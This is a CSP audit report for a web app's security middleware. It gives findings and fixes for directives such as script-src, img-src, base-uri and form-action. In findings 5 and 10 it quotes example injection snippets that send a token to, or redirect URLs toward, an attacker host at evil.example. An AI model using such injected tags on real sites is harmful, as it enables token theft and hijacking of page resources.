# CSP Security Audit — security-middleware.js

## Findings and Fixes

### 1. `script-src`: Removed `'unsafe-inline'` and `'unsafe-eval'`

**Finding:** Both `'unsafe-inline'` and `'unsafe-eval'` were present, completely nullifying XSS protection from CSP.

**Fix:** Removed both. A production Vite bundle requires neither — all scripts are external files. `'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout(string)`, making it trivial to escalate any injected content into code execution. `'unsafe-inline'` permits attacker-injected `<script>` blocks and event handlers.

---

### 2. `script-src`: Replaced wrong Google Analytics origin with correct one

**Finding:** `https://*.google-analytics.com` was listed as a script source, but `gtag.js` is actually served from `https://www.googletagmanager.com`. The wildcard subdomain match also extended trust too broadly.

**Fix:** Replaced with `https://www.googletagmanager.com`. Analytics beacon traffic moved to `connect-src` (see below), which is where it belongs.

---

### 3. `script-src`: Removed `https://cdn.jsdelivr.net`

**Finding:** This CDN is not mentioned in the application description and was not justified. Allowlisting a public CDN that anyone can upload to is nearly equivalent to `'unsafe-inline'` — an attacker who can inject a script tag just needs to host their payload there.

**Fix:** Removed entirely.

---

### 4. `style-src`: Added `https://fonts.googleapis.com`

**Finding:** Google Fonts stylesheets are fetched from `fonts.googleapis.com` via a `<link rel="stylesheet">` tag, which falls under `style-src`. This origin was missing, so the font CSS would be blocked.

**Fix:** Added `https://fonts.googleapis.com` to `style-src`. The `'unsafe-inline'` keyword was retained because removing it requires nonce-based or hash-based CSP infrastructure that is out of scope here; it is less dangerous in `style-src` than in `script-src`.

---

### 5. `img-src`: Tightened from `*` to explicit origins

**Finding:** `img-src *` allows the browser to load images from any origin, including attacker-controlled servers. This can be exploited for cross-origin data exfiltration (e.g. leaking tokens in URL parameters via `<img src="https://evil.example/steal?token=...">`) and for user tracking.

**Fix:** Restricted to `'self' https://images.example.com data:`. The CDN origin is the only external image host described in the README. `data:` is retained for common base64-encoded image use cases in React component libraries.

---

### 6. `font-src`: Fixed to `fonts.gstatic.com` instead of `fonts.googleapis.com`

**Finding:** Google Fonts serves the CSS from `fonts.googleapis.com` but delivers the actual font binary files (`.woff2`) from `fonts.gstatic.com`. The original directive pointed at the CSS host, so font files would be blocked.

**Fix:** Changed `font-src` to `'self' https://fonts.gstatic.com`. The `fonts.googleapis.com` origin is handled by `style-src`.

---

### 7. `connect-src`: Corrected Google Analytics beacon endpoints

**Finding:** Analytics data is sent via `fetch`/`XHR` to `https://www.google-analytics.com` and `https://analytics.google.com`. The original directive used a wildcard subdomain pattern (`*.google-analytics.com`) which is broader than necessary.

**Fix:** Replaced with explicit origins `https://www.google-analytics.com https://analytics.google.com`.

---

### 8. `frame-src`: Changed from `*` to `'none'`

**Finding:** `frame-src *` allows the page to embed any external content in `<iframe>` elements. The application does not describe any iframe usage. This wildcard also weakens clickjacking defenses.

**Fix:** Set to `'none'`. Restore specific origins only if iframe embedding is actually required.

---

### 9. `object-src 'none'` — Added missing directive

**Finding:** Without an explicit `object-src` restriction, `default-src 'self'` governs it, but browser plugin content (`<object>`, `<embed>`, `<applet>`) is a well-known historical attack surface. Explicit denial removes any ambiguity.

**Fix:** Added `object-src 'none'`.

---

### 10. `base-uri`: Changed from `*` to `'self'` (critical)

**Finding:** `base-uri *` is a high-severity misconfiguration. An attacker who can inject a `<base href="https://evil.example/">` tag will redirect all relative URLs — scripts, stylesheets, form actions — to their server. This completely bypasses the rest of the CSP.

**Fix:** Restricted to `'self'`. This is one of the few CSP directives that `default-src` does not cover, so it must be set explicitly.

---

### 11. `form-action`: Changed from `*` to `'self'`

**Finding:** `form-action *` permits HTML forms to submit to any URL. This enables phishing via form hijacking and is an exfiltration vector independent of `connect-src`. Like `base-uri`, this directive is not governed by `default-src`.

**Fix:** Restricted to `'self'`.

---

### 12. Added `upgrade-insecure-requests`

**Finding:** Not a vulnerability in the original policy, but a standard hardening step for a production HTTPS application. It instructs the browser to rewrite any accidental HTTP sub-resource requests to HTTPS before sending them.

**Fix:** Added `upgrade-insecure-requests`.

---

## Summary of Changes

| Directive | Before | After |
|---|---|---|
| `script-src` | `'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://*.google-analytics.com` | `'self' https://www.googletagmanager.com` |
| `style-src` | `'self' 'unsafe-inline'` | `'self' 'unsafe-inline' https://fonts.googleapis.com` |
| `img-src` | `*` | `'self' https://images.example.com data:` |
| `font-src` | `'self' https://fonts.googleapis.com` | `'self' https://fonts.gstatic.com` |
| `connect-src` | `'self' https://*.google-analytics.com` | `'self' https://www.google-analytics.com https://analytics.google.com` |
| `frame-src` | `*` | `'none'` |
| `object-src` | _(missing)_ | `'none'` |
| `base-uri` | `*` | `'self'` |
| `form-action` | `*` | `'self'` |
| `upgrade-insecure-requests` | _(missing)_ | added |
